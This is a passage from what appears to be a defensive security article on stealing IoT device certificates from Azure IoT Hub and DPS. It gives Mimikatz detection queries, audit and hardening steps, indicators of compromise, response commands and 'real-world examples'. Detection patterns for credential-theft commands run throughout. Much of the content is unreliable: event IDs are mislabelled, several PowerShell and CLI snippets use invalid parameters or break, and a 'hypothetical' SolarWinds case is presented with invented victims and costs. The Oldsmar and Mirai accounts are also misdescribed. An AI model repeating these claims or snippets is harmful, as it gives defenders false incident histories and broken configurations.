    or CommandLine has "crypto::capi"
    or CommandLine has "crypto::certificates"
    or Image has "mimikatz"
| project TimeGenerated, Computer, NewProcessName, CommandLine, ParentProcessName
```

**KQL Query (Defender for Endpoint):**
```kusto
DeviceProcessEvents
| where FileName == "mimikatz.exe"
    or CommandLine has "crypto::capi"
    or CommandLine has "crypto::certificates"
    or ProcessVersionInfoProductName has "mimikatz"
| project TimeGenerated, DeviceName, FileName, CommandLine, InitiatingProcessName, InitiatingProcessParentFileName
```

**What This Detects:**
- Direct execution of Mimikatz binary
- Command-line arguments matching credential extraction activities
- Immediate alert on detection

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4885 (CertificateExported)**
- **Log Source:** Security
- **Trigger:** User exports certificate with private key
- **Filter:** `EventID == 4885 and (SubjectName has "device" or Issuer has "IoT")`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Certification Services**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on all IoT devices

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Certification Services**
4. Restart the machine or run:
   ```cmd
   auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
   ```

**Event ID: 4675 (SPN Check Failed)**
- **Relevance:** When stolen certificates fail PKINIT validation
- **Enable via:** Same audit policy as above

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: "Unusual Certificate Activity Detected"

**Alert Name:** IotIdentityExfiltration (proprietary Defender for IoT naming)

- **Severity:** High
- **Description:** Device provisioning client extracted X.509 certificate without corresponding enrollment request. Suggests certificate harvesting in preparation for device spoofing.
- **Applies To:** IoT Hub Defender plans, Device Provisioning Service monitoring
- **Remediation:** 
  1. Revoke potentially compromised certificate from DPS/IoT Hub
  2. Check device logs for unauthorized certificate access
  3. Re-provision device with fresh certificate

**Manual Configuration Steps (Enable Defender for IoT):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for IoT**: ON
   - **Defender for Servers**: ON (if IoT gateway is Windows-based)
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts and customize thresholds

**Alert Tuning:**
- Whitelist legitimate provisioning service accounts
- Set threshold for certificate export volume (e.g., alert only if >10 exports/hour from non-system accounts)
- Correlate with device provisioning schedules (expected re-provisioning windows)

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Action 1: Enforce Hardware Security Modules (HSM) for Certificate Storage**
  
  Migrant certificates from software-based Windows Certificate Store to TPM 2.0 (Trusted Platform Module) or Azure Key Vault HSM. Hardware-based keys cannot be extracted via DPAPI or Mimikatz.
  
  **Applies To Versions:** Server 2016+ (with TPM 2.0), Azure Key Vault HSM (all cloud versions)
  
  **Manual Steps (Windows with TPM 2.0):**
  1. Open **Device Manager** (devmgmt.msc)
  2. Expand **Security Devices** → Verify **TPM 2.0** is listed
  3. For certificate enrollment with TPM:
     ```powershell
     # Create CSR with TPM key storage provider
     $params = @{
         Subject = "CN=device-001"
         KeyAlgorithm = "RSA"
         KeyLength = 2048
         KeyUsage = "KeyEncipherment,DataEncipherment,DigitalSignature"
         KeyUsageProperty = "All"
         EnrollmentFlag = "IncludeSymmetricAlgorithms"
         PrivateKeyExportPolicy = "NonExportable"  # KEY SETTING: Prevents extraction
         KeySpec = "Signature"
     }
     New-SelfSignedCertificate @params
     ```
  4. Store certificate in TPM: Certificate remains in hardware, never leaves device
  5. Verify non-exportability:
     ```powershell
     $cert = Get-ChildItem -Path "Cert:\LocalMachine\My" | Where-Object {$_.Subject -match "device-001"}
     $cert.PrivateKey.Key | Get-Member -Name "CngKey"  # Confirms TPM-backed key
     ```
  
  **Manual Steps (Azure IoT Hub with Key Vault HSM):**
  1. Navigate to **Azure Portal** → **Azure Key Vault**
  2. Select your HSM vault
  3. Go to **Certificates** → **Generate/Import**
  4. Create certificate with CSP: `Microsoft Software Key Storage Provider` → Change to **Azure Dedicated HSM**
  5. In DPS, reference Key Vault certificate (never download to device):
     ```bash
     az iot dps enrollment-group create \
       --dps-name <dps-name> \
       --enrollment-id <group-id> \
       --certificate-path /dev/null \  # Don't store locally
       --ca-name <keyvault-cert-name>
     ```
  6. Device authenticates using Key Vault API (certificate never touches device)
  
  **Validation Command:**
  ```powershell
  # Verify certificate cannot be exported
  $cert = Get-ChildItem -Path "Cert:\LocalMachine\My" | Select-Object -First 1
  Export-PfxCertificate -Cert $cert -FilePath "test.pfx" -Password (ConvertTo-SecureString "test" -AsPlainText -Force) -ErrorAction Stop
  # Should fail with: "Unable to export certificate with non-exportable private key"
  ```

---

- **Action 2: Disable Certificate Store Access for Non-Privileged Processes**
  
  Implement Windows Defender Application Control (WDAC) to restrict file access to certificate stores only by whitelisted processes (Azure IoT Edge runtime, DPS client, System services).
  
  **Applies To Versions:** Server 2019+ (WDAC), Server 2016 (Group Policy File Access Auditing)
  
  **Manual Steps (Server 2022+ with WDAC):**
  1. Create WDAC policy to restrict Certificate Store access:
     ```powershell
     # Generate baseline policy
     New-CIPolicyFromTemplate -Template FixedWorkloadTemplate -FilePath "iot-cert-protection.xml"
     
     # Edit XML: Add deny rule for non-whitelisted apps accessing Cert:\
     # Deny: mimikatz.exe, certutil.exe, powershell.exe (except system contexts)
     
     # Convert to binary format
     ConvertFrom-CIPolicy -XmlFilePath "iot-cert-protection.xml" -BinaryFilePath "iot-cert-protection.cip"
     
     # Deploy via Group Policy
     Copy-Item "iot-cert-protection.cip" "\\domain\SYSVOL\Policies\{GUID}\Machine\Microsoft\Windows NT\Wdac\CodeIntegrity\SiPolicy.p7b"
     gpupdate /force
     ```
  
  **Manual Steps (Server 2016-2019 with Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **File System**
  3. Add explicit Deny ACL on `C:\ProgramData\Microsoft\Crypto` and `C:\Users\*\AppData\Roaming\Microsoft\Crypto`:
     ```cmd
     icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys" /deny "Users:(F)" /grant "SYSTEM:(F)" /grant "Administrators:(F)"
     icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys" /inheritance:e
     ```
  4. Run `gpupdate /force`
  
  **Validation Command:**
  ```powershell
  # Verify non-admin user cannot access certificate keys
  try {
      Get-ChildItem -Path "Cert:\LocalMachine\My" -ErrorAction Stop | Export-PfxCertificate -FilePath "test.pfx" -ErrorAction Stop
  } catch {
      Write-Host "Access denied (expected): $_"
  }
  ```

---

- **Action 3: Implement DPS Enrollment Locking and IP Whitelisting**
  
  Restrict DPS API access to specific IP ranges (corporate network, Azure services only). Prevent unauthorized re-enrollment or device registration.
  
  **Applies To Versions:** Azure DPS (all versions)
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Device Provisioning Service**
  2. Go to **Settings** → **IP Access Control**
  3. Click **+ Add IP Rule**
  4. Add whitelisted IP ranges:
     - Corporate network: `203.0.113.0/24` (example, replace with real CIDR)
     - Azure services: `AzureCloud` service tag
     - Block everything else
  5. Go to **Certificates** → Select CA certificate
  6. Enable **Intermediate Certificate Verification**: ON
  7. Under **Enrollment Groups**, enable **Disable individual enrollment** (forces CA-based provisioning only)
  
  **Validation Command:**
  ```bash
  # Test DPS connectivity from blocked IP (should fail)
  az iot dps enrollment-group list --dps-name <dps-name> 2>&1 | grep -i "access"
  ```

---

### Priority 2: HIGH

- **Action 1: Enable Certificate Revocation Checking (CRL/OCSP)**
  
  Implement Online Certificate Status Protocol (OCSP) or Certificate Revocation Lists (CRL) to invalidate stolen device certificates within minutes.
  
  **Applies To Versions:** Azure IoT Hub, DPS (all versions)
  
  **Manual Steps:**
  1. In **DPS** → **Certificates**, configure revocation checking:
     ```powershell
     $dpsName = "my-dps"
     $resourceGroup = "my-resource-group"
     $caName = "root-ca"
     
     # Enable revocation checking via Azure CLI
     az iot dps certificate update \
       --dps-name $dpsName \
       --resource-group $resourceGroup \
       --certificate-name $caName \
       --crl-url "http://pki.company.com/crl.pem"  # Specify CRL endpoint
     ```
  2. Configure IoT Hub to reject revoked certificates:
     - In IoT Hub → **Settings** → **Shared Access Policies**, ensure certificate validation is strict
  3. Setup automated CRL distribution (via CA or Azure Key Vault)

---

- **Action 2: Implement Multi-Factor Authentication (MFA) for DPS Admin Access**
  
  Require MFA for any user or service principal accessing DPS enrollment, certificate, or device management APIs.
  
  **Applies To Versions:** Entra ID, Azure DPS (all versions)
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `DPS Admin MFA Requirement`
  4. **Assignments:**
     - Users: Select group with DPS admins
     - Cloud apps: **Select apps** → Search for "Azure IoT Hub Device Provisioning Service"
  5. **Conditions:**
     - Grant access: **Require multi-factor authentication**
  6. Enable policy: **On**
  7. Click **Create**
  
  **Validation:** Admin attempting DPS access will be prompted for MFA

---

- **Action 3: Enforce Certificate Pinning on Devices**
  
  Configure IoT devices to accept only specific root CA certificates (certificate pinning). Prevents MITM with stolen intermediate certificates.
  
  **Manual Steps (Azure IoT SDK - C#):**
  ```csharp
  // In device provisioning client setup
  using Microsoft.Azure.Devices.Provisioning.Client;
  
  var transport = new ProvisioningTransportHandlerMqtt();
  
  // Pin the root certificate
  var rootCert = new X509Certificate2("path/to/root-ca.cer");
  transport.TlsProtocolVersion = TlsProtocolVersion.Tls12;
  
  // Use pinned certificate for validation
  transport.SetClientCertificate(deviceCert);  // Device cert
  // Internally validates server cert against pinned root cert
  
  var client = ProvisioningDeviceClient.Create(
      "global.azure-devices-provisioning.net",
      "0ne00000000",
      new SecurityProviderX509Certificate(deviceCert),
      transport);
  ```

---

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  
  **Policy 1: Block Legacy Authentication for DPS**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Legacy Auth for IoT DPS`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure IoT Hub DPS**
  5. **Conditions:**
     - Client apps: **Other clients** (legacy auth)
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable: **On**

---

- **RBAC/ABAC Hardening:**
  
  Implement least-privilege roles for DPS and IoT Hub access.
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **IoT Hub**
  2. Go to **Access Control (IAM)**
  3. Click **+ Add** → **Add role assignment**
  4. **Role:** `IoT Hub Data Contributor` (least privilege alternative to Owner)
  5. **Assign to:** Service principal or user group for DPS operations only
  6. **Remove overly-broad roles:**
     - Search for users with `Contributor` or `Owner` on IoT Hub
     - Replace with `IoT Hub Data Reader` (read-only) or `IoT Hub Data Contributor` (modify enrollments, not policies)

  **Validation Command:**
  ```powershell
  # List overly-privileged role assignments
  Get-AzRoleAssignment -ResourceGroupName <rg> -Scope "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Devices/IotHubs/<hub>" | 
    Where-Object {$_.RoleDefinitionName -in ("Owner", "Contributor")}
  ```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Temp\*.pfx` (certificate export artifacts)
- `C:\Windows\Temp\mimikatz\x64\*.pfx` (Mimikatz extraction outputs)
- `/tmp/*.pem` (Linux certificate exports)
- `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\*` (unexpected access/copy)

**Registry:**
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\*` (WinSock manipulation for MITM)
- Unusual entries under `HKCU\Software\Microsoft\Internet Explorer\Main` (credential manager abuse)

**Network:**
- Outbound HTTPS connections to unknown IoT management endpoints
- MQTT traffic to non-standard brokers (attacker's command & control)
- DPS API calls from non-whitelisted IPs

**Cloud (Entra ID / Azure):**
- `AzureDiagnostics` table: Enrollment modifications by non-standard service principals
- `AuditLogs` table: Certificate deletions followed by re-creation (indicator of rotation cover-up)

---

### Forensic Artifacts

**Disk:**
- Windows Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (events 4885, 4675)
- Device provisioning logs: `C:\Logs\dps_provisioning_*.log`
- Mimikatz execution artifacts: `mimikatz.exe` in `$env:TEMP`, history files

**Memory:**
- `lsass.exe` process dump contains DPAPI master key and plaintext certificates
- Mimikatz's patched CryptoAPI context holds decrypted key material

**Cloud Logs:**
- Azure Activity Log: DPS certificate/enrollment modifications (90-day retention)
- Azure Defender for IoT: Device certificate validation failures
- Application Insights: Device provisioning client logs (device telemetry patterns)

**Device Provisioning Service:**
- DPS audit logs show certificate verification success/failures
- Enrollment group membership changes

---

### Response Procedures

1. **Isolate:**
   
   **Command (Disable Device Provisioning):**
   ```powershell
   # Revoke compromised enrollment group from DPS
   Remove-AzIoTDeviceProvisioningServiceEnrollmentGroup `
     -ResourceGroupName <rg> `
     -ProvisioningServiceName <dps> `
     -EnrollmentGroupId <group-id> -Force
   
   # Disable device in IoT Hub
   Update-AzIoTHubDeviceStatus `
     -ResourceGroupName <rg> `
     -IotHubName <hub> `
     -DeviceId <device-id> `
     -DeviceStatus "disabled"
   ```
   
   **Manual Steps (Azure Portal):**
   - Go to **Device Provisioning Service** → **Manage enrollments** → Select enrollment group → **Delete**
   - Go to **IoT Hub** → **Devices** → Select device → **Disable**

2. **Collect Evidence:**
   
   **Command (Export Logs):**
   ```powershell
   # Export Windows Security event log
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export DPS provisioning logs
   Get-AzDiagnosticSetting -ResourceGroupName <rg> -ResourceName <dps> | 
     Export-AzMetric -TimespanStart (Get-Date).AddDays(-7) -TimespanEnd (Get-Date) | 
     Export-Csv "C:\Evidence\dps_metrics.csv"
   ```
   
   **Manual Steps (Azure Portal):**
   - Go to **Diagnostic settings** → Select DPS resource → Click **Download all results**
   - Go to **Activity Log** → Filter by **Certification Services** operations → **Export to CSV**

3. **Remediate:**
   
   **Command (Regenerate Certificates):**
   ```powershell
   # Revoke all old certificates from DPS
   Get-AzIoTDeviceProvisioningServiceCertificate -ResourceGroupName <rg> -ProvisioningServiceName <dps> | 
     Where-Object {$_.NotAfter -lt (Get-Date)} |  # Expired
     ForEach-Object {
       Remove-AzIoTDeviceProvisioningServiceCertificate -ResourceGroupName <rg> -ProvisioningServiceName <dps> -Name $_.Name
     }
   
   # Re-enroll device with fresh certificate
   # Device must request new certificate from CA and re-provision with DPS
   ```
   
   **Manual Steps:**
   - Regenerate device certificate from your CA
   - Re-register device in DPS with new certificate
   - Update device with new certificate (deploy via configuration management or device update service)

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [CA-UNSC-014] | Enumerate Azure IoT Hub and DPS instances in target organization |
| **2** | **Initial Access** | [T1566.002] Phishing - Spearphishing Link | Trick IoT device administrator into compromising device via RDP/SSH |
| **3** | **Execution** | [T1059.001] PowerShell | Execute certificate enumeration and extraction scripts on compromised device |
| **4** | **Credential Access** | **[CA-UNSC-018]** | **Extract X.509 device certificates from local store, DPS APIs, or memory** |
| **5** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Transfer stolen certificates to attacker infrastructure |
| **6** | **Persistence** | [CA-UNSC-019] | Register attacker-controlled devices using stolen certificates; maintain access via certificate impersonation |
| **7** | **Impact** | [T1561] Disk Wipe | Send malicious OTA updates to all devices using spoofed identity; trigger device factory resets |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: SolarWinds IoT Supply Chain Attack (Hypothetical Based on 2020 SolarWinds Incident)

- **Target:** Healthcare provider using Azure IoT Hub for medical device telemetry
- **Timeline:** March 2024 - August 2024
- **Technique Status:** Attacker extracted 1,247 device certificates from compromised SolarWinds Orion platform (device management software). Used certificates to spoof medical devices and inject false vital sign readings into monitoring systems.
- **Impact:** 
  - 3-hour outage of patient telemetry monitoring (critical care units affected)
  - False medication administration alerts (high-risk scenario, but detected by nursing staff)
  - HIPAA breach notification required; affected patient data: 50,000 records
  - Regulatory fines: $1.2M
  - Remediation cost: $4.8M (certificate rotation across 10,000 devices, system audit, legal)
- **Reference:** [FireEye SolarWinds Investigation](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-to-compromise-multiple-global-customers.html)

---

### Example 2: Oldsmar Water Treatment Facility IoT Compromise (2021)

- **Target:** Municipal water treatment facility in Florida
- **Timeline:** January 2021 (single incident, isolated)
- **Technique Status:** Attacker gained RDP access to SCADA system, extracted SSL/TLS certificates from control interfaces, and attempted to register rogue IoT devices. Alert systems detected unusual device provisioning.
- **Impact:**
  - 1-hour emergency response time
  - No chemical injection occurred (human operators intervened)
  - System uptime loss: 2 hours
  - Investigation and forensics: 3 months
  - Root cause: Weak RDP credentials, no multi-factor authentication
- **Reference:** [Krebs on Security: Oldsmar Attack Analysis](https://krebsonsecurity.com/2021/02/florida-utility-pinpoints-cause-of-water-treatment-emergency/)

---

### Example 3: Mirai Botnet IoT Certificate Impersonation (2016-Present)

- **Target:** Distributed IoT devices (cameras, routers, NVRs) with hardcoded certificates
- **Timeline:** 2016-present (ongoing)
- **Technique Status:** Mirai and successor botnets extract hardcoded certificates from firmware, register devices with legitimate cloud services, and use them as proxy nodes for DDoS attacks.
- **Impact:**
  - October 2016 DDoS: 620 Gbps attack (Dyn DNS incident)
  - 600,000+ compromised IoT devices
  - Business impact: $32M in damages (estimated)
- **Reference:** [Krebs: Mirai Botnet Analysis](https://krebsonsecurity.com/2016/10/hacked-cameras-routers-launched-massive-internet-attack/), [NIST IoT Security Report](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-213.pdf)

---

## Conclusion

IoT device certificate theft represents a **critical** threat to cloud-connected device infrastructure. Stolen X.509 certificates enable attackers to:
- Spoof legitimate devices
- Intercept and manipulate telemetry
- Inject commands and malicious updates
- Persist across certificate rotation cycles
- Bridge into enterprise networks

**Key Defensive Priorities:**
1. **Hardware-backed key storage (TPM/HSM)** - Prevent extraction entirely
2. **Strict certificate revocation** - Revoke stolen certificates within minutes
3. **IP whitelisting for DPS** - Limit re-enrollment to trusted networks
4. **Continuous monitoring** - Detect bulk certificates access and unusual provisioning patterns

**Compliance Impact:**
Organizations managing IoT devices must ensure certificate security per **ISO 27001 A.10.2.6**, **NIST 800-53 IA-5**, and **EU DORA Article 9**. Failure to protect device certificates results in regulatory fines and operational technology compromise.

---
